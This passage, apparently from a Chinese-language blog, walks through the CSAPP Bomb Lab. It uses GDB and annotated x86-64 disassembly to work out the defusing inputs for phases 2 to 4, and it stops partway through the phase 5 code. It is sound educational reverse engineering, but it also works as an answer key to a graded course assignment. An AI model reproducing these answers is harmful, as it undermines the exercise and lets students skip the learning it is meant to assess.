<p>显示<code>Phase 1 defused</code>, 表示第一关已成功通过。</p>
<h4><span id="几个调试汇编代码相关的gdb指令">几个调试汇编代码相关的GDB指令</span></h4><p>使用<code>disassemble</code>指令查看汇编代码，箭头表示下一步即将执行的汇编指令。</p>
<p><code>si</code>指令用于单步执行汇编代码，相当于<code>stepi</code></p>
<p><code>ni</code>指令以函数调用为单位进行单步执行， 相当于<code>nexti</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble</span><br><span class="line">Dump of assembler code for function phase_1:</span><br><span class="line">   0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi</span><br><span class="line">=&gt; 0x0000000000400ee9 &lt;+9&gt;:     callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax</span><br><span class="line">   0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400ef2 &lt;+18&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x0000000000400efb &lt;+27&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>更多用法参考<code>gdb</code>手册或《CSAPP 原书第3版》3.10.2小节 —— 使用GDB调试器</p>
<h4><span id="拆弹小技巧">拆弹小技巧</span></h4><ul>
<li><p>查看<code>bomb</code>符号表或者直接查看汇编代码，会发现有个<code>explode_bomb</code>符号，该函数用来引爆炸弹。</p>
</li>
<li><p>调试时可以对该函数设置断点，在拆弹失败时暂停运行，不让其爆炸，便于调试。可使用 <code>b explode_bomb</code>指令设置断点</p>
</li>
</ul>
<h3><span id="第二关">第二关</span></h3><p>先贴出第二关<code>phase_2</code>的部分汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:   55                      push   %rbp</span><br><span class="line">  400efd:   53                      push   %rbx</span><br><span class="line">  400efe:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  400f02:   48 89 e6                mov    %rsp,%rsi	# %rsi作为read_six_numbers的第二个入参传递, $rsp既是入参也是出参；第一个入参为$rdi, 即用户输入的字符串</span><br><span class="line">  400f05:   e8 52 05 00 00          callq  40145c &lt;read_six_numbers&gt; # 读六个数字</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<p><code>phase_2</code>程序先调用<code>read_six_numbers</code>。该函数接受两个参数，第一个参数为<code>$rdi</code>, 即我们输入的字符串；第二个参数为<code>$rsp</code>, <code>$rsp</code>既是入参也是出参，用于保存<code>read_six_numbers</code>函数解析<code>$rdi</code>后得到的6个整数。想得到这个结论，需要分析<code>read_six_numbers</code>代码，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble read_six_numbers</span><br><span class="line">Dump of assembler code for function read_six_numbers:</span><br><span class="line">   0x000000000040145c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401460 &lt;+4&gt;:     mov    %rsi,%rdx		# sscanf函数的第1个可变参数，第3个参数，通过%rdx传递</span><br><span class="line">   0x0000000000401463 &lt;+7&gt;:     lea    0x4(%rsi),%rcx	# sscanf函数的第2个可变参数，第4个参数, 通过%rcx传递</span><br><span class="line">   0x0000000000401467 &lt;+11&gt;:    lea    0x14(%rsi),%rax	# sscanf函数的第6个可变参数，第8个参数，通过栈传递</span><br><span class="line">   0x000000000040146b &lt;+15&gt;:    mov    %rax,0x8(%rsp)</span><br><span class="line">   0x0000000000401470 &lt;+20&gt;:    lea    0x10(%rsi),%rax  # sscanf函数的第5个可变参数，第7个参数，通过栈传递</span><br><span class="line">   0x0000000000401474 &lt;+24&gt;:    mov    %rax,(%rsp)</span><br><span class="line">   0x0000000000401478 &lt;+28&gt;:    lea    0xc(%rsi),%r9	# sscanf函数的第4个可变参数，第6个参数, 通过%r9传递</span><br><span class="line">   0x000000000040147c &lt;+32&gt;:    lea    0x8(%rsi),%r8	# sscanf函数的第3个可变参数，第5个参数, 通过%r8传递</span><br><span class="line">   0x0000000000401480 &lt;+36&gt;:    mov    $0x4025c3,%esi	# sscanf函数的第2个参数，通过%esi传递，0x4025c3地址的格式化字符串为&quot;%d %d %d %d %d %d&quot;，表示输入字符串应该为6个整数</span><br><span class="line">   0x0000000000401485 &lt;+41&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x000000000040148a &lt;+46&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x000000000040148f &lt;+51&gt;:    cmp    $0x5,%eax		# sscanf读入的可变参数需大于5个，否则爆炸</span><br><span class="line">   0x0000000000401492 &lt;+54&gt;:    jg     0x401499 &lt;read_six_numbers+61&gt;</span><br><span class="line">   0x0000000000401494 &lt;+56&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401499 &lt;+61&gt;:    add    $0x18,%rsp</span><br><span class="line">   0x000000000040149d &lt;+65&gt;:    retq</span><br></pre></td></tr></table></figure>

<p>查看<code>0x400f02</code>, <code>0x401463 ~ 0x40147c</code>处的代码，我们可以把调用者<code>phase_2</code>中的<code>$rsp</code>看作一个一维数组的首地址，该数组的长度为6，内容依次为<code>$rsp</code>, <code>$rsp + 4</code>, <code>$rsp + 8</code>, <code>$rsp + 12</code>, <code>$rsp + 16</code>, <code>$rsp + 20</code>，用于 保存<code>sscanf</code>函数执行后生成的6个整数。</p>
<h4><span id="炸弹用sscanf读取并解析用户输入字符串">炸弹用sscanf读取并解析用户输入字符串</span></h4><p>注意到<code>0x40148a</code>处调用<code>sscanf</code>函数，作用是从用户输入的字符串<code>%rdi</code>中解析出6个整数，保存到调用者<code>phase_2</code>中的<code>$rsp</code></p>
<p>C语言中<code>sscanf</code>函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sscanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure>

<p>对照汇编代码， <code>$rdi</code>相当于<code>sscanf</code>的参数<code>str</code>；查看<code>0x401480</code>代码，<code>$esi</code>相当于<code>sscanf</code>的参数<code>format</code>， 用gdb查看<code>0x4025c3</code>处的字符串，为<code>&quot;%d %d %d %d %d %d&quot;</code>， 说明<code>sscanf</code>中的可变参数个数为6，且都是指向<code>int</code>类型的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4025c3</span><br><span class="line">0x4025c3:       &quot;%d %d %d %d %d %d&quot;</span><br></pre></td></tr></table></figure>

<p>可以看出<code>sscanf</code>函数实际上接收8个入参。<code>read_six_numbers</code>利用<code>%rdi</code>,  <code> %rsi</code>，<code>%rdx</code>, <code>%rcx</code>, <code>%r8</code>, <code>%r9</code>分别传递用户输入字符串、格式化字符串、6个整数中的前4个。而第5、6个整数超出了六个参数，需通过栈传递。</p>
<p><strong>到此，确定了第二关需要输入6个整数, 且这6个整数保存在调用者<code>phase_2</code>的<code>%rsp</code>中</strong>，用gdb验证这个结论：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br><span class="line">(gdb) set args answer 	# 第二行可随便输入6个数，例如1 2 3 4 5 6</span><br><span class="line">(gdb) b *0x400f0a</span><br><span class="line">(gdb) c</span><br><span class="line">Breakpoint 3, 0x0000000000400f0a in phase_2 ()</span><br><span class="line">(gdb) x/6x $rsp			# 查看$rsp, 和输入字符串中6个数一致</span><br><span class="line">0x7fffffffe420: 0x00000001      0x00000002      0x00000003      0x00000004</span><br><span class="line">0x7fffffffe430: 0x00000005      0x00000006</span><br></pre></td></tr></table></figure>

<p>再看下<code>phase_2</code>完整代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:   55                      push   %rbp</span><br><span class="line">  400efd:   53                      push   %rbx</span><br><span class="line">  400efe:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  400f02:   48 89 e6                mov    %rsp,%rsi 			# %rsi作为read_six_numbers的第二个入参传递, $rsp既是入参也是出参；第一个入参为$rdi, 即用户输入的字符串</span><br><span class="line">  400f05:   e8 52 05 00 00          callq  40145c &lt;read_six_numbers&gt; # 读六个数字</span><br><span class="line">  400f0a:   83 3c 24 01             cmpl   $0x1,(%rsp) 			# %rsp为调用者保存寄存器，过程调用前后值不变，因此保存的是read_six_numbers输出的6个数，(%rsp)保存的是第一个整数</span><br><span class="line">  400f0e:   74 20                   je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:   e8 25 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:   eb 19                   jmp    400f30 &lt;phase_2+0x34&gt;# 将6个整数看作一个数组</span><br><span class="line">  400f17:   8b 43 fc                mov    -0x4(%rbx),%eax		# 将数组前一个数保存到%eax</span><br><span class="line">  400f1a:   01 c0                   add    %eax,%eax			# 将%eax乘以2</span><br><span class="line">  400f1c:   39 03                   cmp    %eax,(%rbx)			# 判断当前整数是否为前一个数的两倍， 不等则爆炸，相等跳转到400f25，</span><br><span class="line">  400f1e:   74 05                   je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:   e8 15 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:   48 83 c3 04             add    $0x4,%rbx			# 每次循环，将rbx值加4，即指向数组的下一个元素</span><br><span class="line">  400f29:   48 39 eb                cmp    %rbp,%rbx			# rbp指向数组结尾，标识循环是否结束</span><br><span class="line">  400f2c:   75 e9                   jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:   eb 0c                   jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:   48 8d 5c 24 04          lea    0x4(%rsp),%rbx 		# 最初rbx指向第二个数，</span><br><span class="line">  400f35:   48 8d 6c 24 18          lea    0x18(%rsp),%rbp  	# %rbp = $rsp + 24</span><br><span class="line">  400f3a:   eb db                   jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  400f40:   5b                      pop    %rbx</span><br><span class="line">  400f41:   5d                      pop    %rbp</span><br><span class="line">  400f42:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>由<code>0x400f0a: cmpl  $0x1,(%rsp)</code>可知，第一个整数一定是1，然后跳转到<code>0x400f30</code>进入循环。</p>
<p>将这6个数看作一个数组， 由<code>0x400f30</code>处代码，<code>$rbx</code>可看作这个数组的下标，初始值为1，指向第2个整数；由<code>0x400f35</code>处代码，<code>$rbp</code>标识着数组的结尾，用于判断循环是否退出。</p>
<p>由<code>0x400f17</code> ~ <code>0x400f1c</code>代码可知，每次循环判断数组当前元素是否为前一个元素的两倍，不等则爆炸。因此答案为<code>1 2 4 8 16 32</code>， 唯一解。</p>
<h3><span id="第三关">第三关</span></h3><p><code>phase_3</code>的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:   48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">  400f47:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx		# 第二个整数位于$rsp + 12</span><br><span class="line">  400f4c:   48 8d 54 24 08          lea    0x8(%rsp),%rdx		# 第一个整数位于%rsp + 8</span><br><span class="line">  400f51:   be cf 25 40 00          mov    $0x4025cf,%esi		# 查看0x4025cf地址处内存，为&quot;%d %d&quot;，表示接受两个整数作为输入</span><br><span class="line">  400f56:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400f5b:   e8 90 fc ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:   83 f8 01                cmp    $0x1,%eax			# sscanf返回值需大于1，否则爆炸。说明可变参数个数为2</span><br><span class="line">  400f63:   7f 05                   jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:   e8 d0 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:   83 7c 24 08 07          cmpl   $0x7,0x8(%rsp)		# 第一个数必须小于7，否则爆炸</span><br><span class="line">  400f6f:   77 3c                   ja     400fad &lt;phase_3+0x6a&gt;# 比较结果大于0则跳转</span><br><span class="line">  400f71:   8b 44 24 08             mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:   ff 24 c5 70 24 40 00    jmpq   *0x402470(,%rax,8)	# 跳转表结构，对应C语言中的switch语句</span><br><span class="line">  400f7c:   b8 cf 00 00 00          mov    $0xcf,%eax			# %rax = 0，跳转到400f7c</span><br><span class="line">  400f81:   eb 3b                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:   b8 c3 02 00 00          mov    $0x2c3,%eax</span><br><span class="line">  400f88:   eb 34                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:   b8 00 01 00 00          mov    $0x100,%eax</span><br><span class="line">  400f8f:   eb 2d                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:   b8 85 01 00 00          mov    $0x185,%eax</span><br><span class="line">  400f96:   eb 26                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:   b8 ce 00 00 00          mov    $0xce,%eax</span><br><span class="line">  400f9d:   eb 1f                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:   b8 aa 02 00 00          mov    $0x2aa,%eax</span><br><span class="line">  400fa4:   eb 18                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:   b8 47 01 00 00          mov    $0x147,%eax</span><br><span class="line">  400fab:   eb 11                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:   e8 88 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400fb7:   eb 05                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:   b8 37 01 00 00          mov    $0x137,%eax</span><br><span class="line">  400fbe:   3b 44 24 0c             cmp    0xc(%rsp),%eax		# 判断%eax值与第二个参数是否相等，不等则爆炸</span><br><span class="line">  400fc2:   74 05                   je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:   e8 71 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  400fcd:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>与第二关类似，查看<code>0x400f51</code>处代码<code>mov $0x4025cf $esi</code> , 用gdb打印<code>0x4025cf</code>处内存，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4025cf</span><br><span class="line">0x4025cf:       &quot;%d %d&quot;</span><br></pre></td></tr></table></figure>

<p>内容为<code>&quot;%d %d&quot;</code>，表示这一关需要输入两个整数。</p>
<p>由<code>400f47 ~ 400f4c</code>代码可知，第一个整数位于<code>$rsp + 8</code>地址，第二个整数位于<code>$rsp + 12</code>地址</p>
<h4><span id="确认这两个整数应满足的条件">确认这两个整数应满足的条件</span></h4><p>观察<code>0x400f6a</code>处的<code>cmp</code>指令。注意比较顺序，是计算<code>*(%rsp + 8) - 7</code> 的值，再判断这个值是否大于<code>0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">400f6a:   83 7c 24 08 07          cmpl   $0x7,0x8(%rsp)		# 第一个数必须小于7，否则爆炸</span><br><span class="line">400f6f:   77 3c                   ja     400fad				# 引爆炸弹</span><br></pre></td></tr></table></figure>

<p>以上两句汇编等同于 <code>if (*rsp+8) &gt; 7, 跳转到0x400fad</code>， 因此第一个数必须不大于7。</p>
<p><code>0x400f75</code>处<code>jmpq *0x402470(,%rax,8)</code>是一个间接跳转指令, 可以看出这段代码是典型的switch语句，跳转表就存在于<code>0x402470</code>。<code>%rax</code>取值为[0, 7]，代表switch语句中8条不同的case。 打印这张跳转表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/8g 0x402470</span><br><span class="line">0x402470:       0x0000000000400f7c      0x0000000000400fb9</span><br><span class="line">0x402480:       0x0000000000400f83      0x0000000000400f8a</span><br><span class="line">0x402490:       0x0000000000400f91      0x0000000000400f98</span><br><span class="line">0x4024a0:       0x0000000000400f9f      0x0000000000400fa6</span><br></pre></td></tr></table></figure>

<p>举例，第一个整数取0时，会跳转到<code>0x400f7c</code>, 将<code>0xcf</code>赋给<code>%rax</code>，<code>0x400fbe</code>处再判断<code>$rax</code>和第二个整数是否相等。因此<code>0 207</code>为满足条件的一组解。依次类推，一共得到8组解，答案不唯一，任选一种即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 207</span><br><span class="line">1 311</span><br><span class="line">2 707</span><br><span class="line">3 256</span><br><span class="line">4 389</span><br><span class="line">5 206</span><br><span class="line">6 682</span><br><span class="line">7 327</span><br></pre></td></tr></table></figure>

<p>switch语句和跳转表内容可参考 《CSAPP 原书第3版》 3.6.8小节 —— switch语句。</p>
<h3><span id="第四关">第四关</span></h3><p><code>phase_4</code>的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:   48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">  401010:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx		# 第二个整数，用$rcx保存</span><br><span class="line">  401015:   48 8d 54 24 08          lea    0x8(%rsp),%rdx		# 第一个整数，用%rdx保存</span><br><span class="line">  40101a:   be cf 25 40 00          mov    $0x4025cf,%esi		# %rsi处字符串: &quot;%d %d&quot;</span><br><span class="line">  40101f:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401024:   e8 c7 fb ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:   83 f8 02                cmp    $0x2,%eax</span><br><span class="line">  40102c:   75 07                   jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:   83 7c 24 08 0e          cmpl   $0xe,0x8(%rsp)		# 将第一个整数和14比较</span><br><span class="line">  401033:   76 05                   jbe    40103a &lt;phase_4+0x2e&gt;# 如果不大于14跳转，否则引爆炸弹</span><br><span class="line">  401035:   e8 00 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:   ba 0e 00 00 00          mov    $0xe,%edx 			# func4函数的第一个入参，初值为14</span><br><span class="line">  40103f:   be 00 00 00 00          mov    $0x0,%esi 			# func4函数的第二个入参，初值为0</span><br><span class="line">  401044:   8b 7c 24 08             mov    0x8(%rsp),%edi 		# func4函数的第三个入参，初值为输入的第一个整数</span><br><span class="line">  401048:   e8 81 ff ff ff          callq  400fce &lt;func4&gt;		# 调用func4, func4为递归函数</span><br><span class="line">  40104d:   85 c0                   test   %eax,%eax			# func4函数必须返回0，否则爆炸</span><br><span class="line">  40104f:   75 07                   jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:   83 7c 24 0c 00          cmpl   $0x0,0xc(%rsp)		# 第二个整数必须为0， 否则爆炸</span><br><span class="line">  401056:   74 05                   je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:   e8 dd 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  401061:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>同样的，先确认输入字符串的格式，查看<code>0x4025cf</code>处的格式化字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4025cf</span><br><span class="line">0x4025cf:       &quot;%d %d&quot;</span><br></pre></td></tr></table></figure>

<p>内容为<code>&quot;%d %d&quot;</code>， 说明需要输入两个整数。第一个整数位于<code>%rsp + 8</code>， 第二个整数位于<code>%rsp + 12</code></p>
<p>由<code>0x40102e ~ 0x401033</code>代码可知，第一个整数必须不大于14， 否则引爆炸弹。</p>
<p>注意到<code>0x401048</code>处调用<code>func4</code>函数，并判断该函数返回值是否为0，不等于0则引爆炸弹。</p>
<p>由<code>0x40103a ~ 0x401044</code>三条语句可知，<code>func4</code>函数接受三个入参，且三个参数的初始值从左到右分别为输入的第一个整数,<code>14</code>, <code>0</code>。下面查看<code>func4</code>代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># int func4(int x, int y, int z);</span><br><span class="line"># x in %edi, y in $esi, z in $edx, ret in $eax</span><br><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  400fd2:   89 d0                   mov    %edx,%eax 			# ret = z</span><br><span class="line">  400fd4:   29 f0                   sub    %esi,%eax			# ret -= y</span><br><span class="line">  400fd6:   89 c1                   mov    %eax,%ecx			# ecx = ret</span><br><span class="line">  400fd8:   c1 e9 1f                shr    $0x1f,%ecx			# ecx = (ecx &gt;&gt; 31) &amp; 0x1</span><br><span class="line">  400fdb:   01 c8                   add    %ecx,%eax			# ret += ecx</span><br><span class="line">  400fdd:   d1 f8                   sar    %eax					# ret &gt;&gt;= 1</span><br><span class="line">  400fdf:   8d 0c 30                lea    (%rax,%rsi,1),%ecx	# ecx = ret + y</span><br><span class="line">  400fe2:   39 f9                   cmp    %edi,%ecx</span><br><span class="line">  400fe4:   7e 0c                   jle    400ff2 &lt;func4+0x24&gt;	# if ecx &lt;= x, jump to 0x400ff2</span><br><span class="line">  400fe6:   8d 51 ff                lea    -0x1(%rcx),%edx		# z = rcx - 1</span><br><span class="line">  400fe9:   e8 e0 ff ff ff          callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:   01 c0                   add    %eax,%eax			# ret *= 2</span><br><span class="line">  400ff0:   eb 15                   jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:   b8 00 00 00 00          mov    $0x0,%eax			# ret = 0</span><br><span class="line">  400ff7:   39 f9                   cmp    %edi,%ecx</span><br><span class="line">  400ff9:   7d 0c                   jge    401007 &lt;func4+0x39&gt;	# if ecx &gt;= x, jump to 0x401007</span><br><span class="line">  400ffb:   8d 71 01                lea    0x1(%rcx),%esi		# y = ecx + 1</span><br><span class="line">  400ffe:   e8 cb ff ff ff          callq  400fce &lt;func4&gt;		# ret = func(x, y, z)</span><br><span class="line">  401003:   8d 44 00 01             lea    0x1(%rax,%rax,1),%eax# ret = 2 * ret + 1</span><br><span class="line">  401007:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  40100b:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>由<code>400fe9</code>和<code>400ffe</code>处的<code>callq 400fce &lt;func4&gt;</code>指令可知发生了递归调用。我们可以将<code>func4</code>的汇编代码逐句翻译成C语言，将第一个整数从0取到14依次调用<code>func4</code>函数，看哪些取值能成功返回<code>0</code>。这里需要了解<code>add</code>,<code> sub</code>,<code> sar</code>,<code> shr</code>,<code>lea</code>,<code> jle</code>等指令的用法以及注意操作数的顺序。</p>
<p><code>func4</code>的递归过程，可以转换为如下的C语言函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// x in %edi, y in $esi, z in $edx, ret in %eax</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func4</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ecx;</span><br><span class="line">    <span class="type">int</span> ret = z - y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(z &lt; y) &#123;</span><br><span class="line">        ret += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    ecx = ret + y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ecx == x) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ecx &lt;= x) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(x, ecx + <span class="number">1</span>, z) + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(x, y, ecx - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i)</span><br><span class="line">        <span class="keyword">if</span>(func4(i, <span class="number">0</span>, <span class="number">14</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;answer: %d\n&quot;</span>, i);	<span class="comment">// 打印出第一个整数的所有取值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译执行C程序，发现第一个整数可以是<code>0</code>， <code>1</code>， <code>3</code>， <code>7</code></p>
<p>由<code>phase_4</code>的<code>0x401051 ~ 0x401056</code>代码可知，第二个整数必须为<code>0</code>，否则引爆炸弹。</p>
<p>因此，一共得到四组解，答案不唯一，任选一种即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 0</span><br><span class="line">1 0</span><br><span class="line">3 0</span><br><span class="line">7 0</span><br></pre></td></tr></table></figure>

<h3><span id="第五关">第五关</span></h3><p><code>phase_5</code>的代码如下, 根据<code>0x40107f</code>处的<code>cmp $0x6, %eax</code>指令，可确定这关需要输入长度为6的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:   53                      push   %rbx</span><br><span class="line">  401063:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line">  401067:   48 89 fb                mov    %rdi,%rbx			# rbx保存输入字符串</span><br><span class="line">  40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  401071:   00 00</span><br><span class="line">  401073:   48 89 44 24 18          mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:   31 c0                   xor    %eax,%eax</span><br><span class="line">  40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:   83 f8 06                cmp    $0x6,%eax			# 输入字符串的长度必须为6,否则爆炸</span><br><span class="line">  401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">  40108f:   88 0c 24                mov    %cl,(%rsp)</span><br><span class="line">  401092:   48 8b 14 24             mov    (%rsp),%rdx</span><br><span class="line">  401096:   83 e2 0f                and    $0xf,%edx 			# 将当前字符与上0xf，结果保存在%edx</span><br><span class="line">  401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx  # 将(0x4024b0+%edx)处的字符保存在%rdx</span><br><span class="line">  4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:   48 83 c0 01             add    $0x1,%rax			# 每次循环%rax加1</span><br><span class="line">  4010a8:   48 83 f8 06             cmp    $0x6,%rax			# 用%rax循环计数，循环6次</span><br><span class="line">  4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi		# 0x40245e处字符串为flyers</span><br><span class="line">  4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi		# 这里需要构造输入串，使得(%rsp+0x10)处的串等于&quot;flyers&quot;</span><br><span class="line">  4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line">  4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:   b8 00 00 00 00          mov    $0x0,%eax			# 循环开始，eax初值为0</span><br><span class="line">  4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:   00 00</span><br><span class="line">  4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:   e8 42 fa ff ff          callq  400b30 